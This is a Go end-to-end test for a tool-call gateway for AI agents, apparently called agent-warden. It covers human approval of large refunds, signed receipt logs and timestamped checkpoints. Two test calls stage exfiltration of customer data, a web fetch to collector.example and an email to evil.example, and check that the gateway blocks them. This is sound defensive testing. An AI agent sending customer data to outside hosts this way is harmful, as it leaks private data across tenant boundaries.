package main

import (
	"bytes"
	"context"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/fkadusei/agent-warden/internal/chain"
	"github.com/fkadusei/agent-warden/internal/checkpoint"
	"github.com/fkadusei/agent-warden/internal/config"
	"github.com/fkadusei/agent-warden/internal/exampletools"
	"github.com/fkadusei/agent-warden/internal/keys"
	"github.com/fkadusei/agent-warden/internal/tsa"
)

func runOK(t *testing.T, stdin string, args ...string) string {
	t.Helper()
	var out, errOut bytes.Buffer
	if code := run(context.Background(), args, strings.NewReader(stdin), &out, &errOut); code != 0 {
		t.Fatalf("warden %v exited %d\nstdout:\n%s\nstderr:\n%s", args, code, out.String(), errOut.String())
	}
	return out.String()
}

// TestEndToEnd drives the binary's commands: init, pin, add-approver,
// issue-task, serve, call, approve, export, and then verifies the result the way
// warden-verify does.
func TestEndToEnd(t *testing.T) {
	const token = "demo-token-123456"
	t.Setenv("WARDEN_SECRET_PAYMENTS", token)
	tools := httptest.NewServer(exampletools.Handler(token))
	defer tools.Close()

	dir := filepath.Join(t.TempDir(), "w")
	cfgPath := filepath.Join(dir, "warden.json")
	runOK(t, "", "init", "--dir", dir, "--tools-url", tools.URL)

	if out := runOK(t, "", "pin", "--config", cfgPath); !strings.Contains(out, "payments/refund") || !strings.Contains(out, "new") {
		t.Fatalf("pin listing:\n%s", out)
	}
	runOK(t, "", "pin", "--config", cfgPath, "--write")
	runOK(t, "", "add-approver", "--config", cfgPath, "--id", "bob@tenant-a", "--out", filepath.Join(dir, "bob.key"))
	runOK(t, "", "issue-task", "--config", cfgPath, "--agent", "support-agent-7", "--principal", "alice@tenant-a", "--task", "ticket-4821", "--out", filepath.Join(dir, "agent"))

	// Serve on ports the OS picks. The config file names fixed ports; the loaded
	// config is changed after validation so tests never collide with a real Warden.
	cfg, err := config.Load(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	cfg.Listen, cfg.ApproverListen = "127.0.0.1:0", "127.0.0.1:0"

	// Timestamp checkpoints with a local RFC 3161 authority (ADR-0014).
	authority, err := tsa.NewAuthority("Test TSA", time.Now().Add(-time.Hour), time.Now().Add(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	tsaServer := httptest.NewServer(authority.Handler())
	defer tsaServer.Close()
	cfg.TSA = &config.TSA{URL: tsaServer.URL, Timeout: config.Duration{Duration: 10 * time.Second},
		Tokens: filepath.Join(dir, "data", "tokens.jsonl")}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	ready := make(chan addrs, 1)
	done := make(chan error, 1)
	var serveOut bytes.Buffer
	go func() { done <- serve(ctx, cfg, &serveOut, func(a addrs) { ready <- a }) }()
	var a addrs
	select {
	case a = <-ready:
	case err := <-done:
		t.Fatalf("serve failed: %v\n%s", err, serveOut.String())
	case <-time.After(20 * time.Second):
		t.Fatal("serve did not start")
	}
	agentURL, approverURL := "https://"+a.Agent, "https://"+a.Approver
	ca := filepath.Join(dir, "pki", "ca.pem")
	agent := []string{"--url", agentURL, "--ca", ca, "--cert", filepath.Join(dir, "agent.pem"), "--key", filepath.Join(dir, "agent.key")}

	call := func(tool, args string) string {
		t.Helper()
		return runOK(t, "", append(append([]string{"call"}, agent...), "--tool", tool, "--args", args)...)
	}
	if out := runOK(t, "", append(append([]string{"call"}, agent...), "--list")...); !strings.Contains(out, "payments.refund") || !strings.Contains(out, "warden.resume") {
		t.Fatalf("tool list:\n%s", out)
	}
	if out := call("crm.lookup", `{"id":"c-100"}`); !strings.Contains(out, `"customer":"c-100"`) {
		t.Fatalf("crm.lookup:\n%s", out)
	}
	if out := call("payments.refund", `{"payment_id":"p-9","amount":50}`); !strings.Contains(out, `"refunded":true`) || strings.Contains(out, token) {
		t.Fatalf("small refund:\n%s", out)
	}
	out := call("payments.refund", `{"payment_id":"p-10","amount":500}`)
	marker := "Decision receipt #"
	i := strings.Index(out, marker)
	if !strings.Contains(out, "needs human approval") || i < 0 {
		t.Fatalf("large refund:\n%s", out)
	}
	seq := strings.TrimSuffix(strings.Fields(out[i+len(marker):])[0], ".")

	bob := []string{"approve", "--url", approverURL, "--ca", ca, "--key", filepath.Join(dir, "bob.key"), "--id", "bob@tenant-a"}
	if out := runOK(t, "", bob...); !strings.Contains(out, "#"+seq) || !strings.Contains(out, "payments/refund") {
		t.Fatalf("pending list:\n%s", out)
	}
	if code := run(context.Background(), append(bob, "--decision", seq), strings.NewReader("n\n"), &bytes.Buffer{}, &bytes.Buffer{}); code == 0 {
		t.Fatal("approval went through without confirmation")
	}
	if out := runOK(t, "y\n", append(bob, "--decision", seq)...); !strings.Contains(out, "approved by bob@tenant-a") {
		t.Fatalf("approve:\n%s", out)
	}
	if out := call("warden.resume", `{"decision_seq":`+seq+`}`); !strings.Contains(out, `"amount":500`) {
		t.Fatalf("resume:\n%s", out)
	}
	// The CRM lookup above put customer data (pii) into the task, so it cannot leave
	// by web request or by email outside the tenant.
	if out := call("web.fetch", `{"url":"https://collector.example/?c=c-100"}`); !strings.Contains(out, "no_web_with_pii") {
		t.Fatalf("web request after customer data:\n%s", out)
	}
	if out := call("mail.send", `{"to":"x@evil.example","body":"c-100 is gold tier"}`); !strings.Contains(out, "no_pii_outside_tenant") {
		t.Fatalf("external mail after customer data:\n%s", out)
	}

	cancel()
	if err := <-done; err != nil {
		t.Fatalf("serve returned %v\n%s", err, serveOut.String())
	}

	logPath := filepath.Join(dir, "export.jsonl")
	runOK(t, "", "export", "--config", cfgPath, "--out", logPath)

	logData, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatal(err)
	}
	keyData, err := os.ReadFile(filepath.Join(dir, "keys.json"))
	if err != nil {
		t.Fatal(err)
	}
	anchorData, err := os.ReadFile(filepath.Join(dir, "data", "anchor.jsonl"))
	if err != nil {
		t.Fatalf("no anchor written: %v", err)
	}
	trusted, err := keys.Parse(keyData)
	if err != nil {
		t.Fatal(err)
	}
	cps, err := checkpoint.ReadVerified(bytes.NewReader(anchorData), cfg.ChainID, keys.Resolver(trusted))
	if err != nil {
		t.Fatal(err)
	}
	rep, err := chain.VerifyWithCheckpoints(bytes.NewReader(logData), cfg.ChainID, keys.Resolver(trusted), cps)
	if err != nil {
		t.Fatalf("exported log does not verify: %v", err)
	}
	// lookup 2 + small refund 2 + large refund decision 1 + approval 1 + resumed
	// result 1 + denied web request 1 + denied email 1
	if rep.Unanchored != 0 || rep.Receipts != 9 {
		t.Fatalf("report %+v", rep)
	}
	if bytes.Contains(logData, []byte(token)) {
		t.Fatal("the receipt log contains the payments token")
	}

	// Every anchored checkpoint carries a timestamp from the authority, over exactly
	// the anchored bytes.
	tokenData, err := os.ReadFile(cfg.Path(cfg.TSA.Tokens))
	if err != nil {
		t.Fatalf("no timestamps were written: %v", err)
	}
	tokens, err := tsa.ReadTokens(bytes.NewReader(tokenData))
	if err != nil {
		t.Fatal(err)
	}
	stamped := 0
	for _, line := range bytes.Split(bytes.TrimSpace(anchorData), []byte("\n")) {
		for _, tok := range tokens[tsa.Digest(line)] {
			when, err := tsa.Verify(tok, line, authority.Roots())
			if err != nil {
				t.Fatalf("timestamp over an anchored checkpoint: %v", err)
			}
			if time.Since(when) > time.Hour {
				t.Fatalf("timestamp %s is not from this run", when)
			}
			stamped++
		}
	}
	if stamped != len(cps) {
		t.Fatalf("%d timestamps for %d anchored checkpoints", stamped, len(cps))
	}
}

func TestInitRefusesNonEmptyDir(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "x"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if code := run(context.Background(), []string{"init", "--dir", dir}, strings.NewReader(""), &bytes.Buffer{}, &bytes.Buffer{}); code == 0 {
		t.Fatal("init wrote into a non-empty directory")
	}
}

func TestUnknownCommand(t *testing.T) {
	var errOut bytes.Buffer
	if code := run(context.Background(), []string{"launch"}, strings.NewReader(""), &bytes.Buffer{}, &errOut); code != 2 || !strings.Contains(errOut.String(), "usage") {
		t.Fatalf("code %d, stderr %q", code, errOut.String())
	}
}
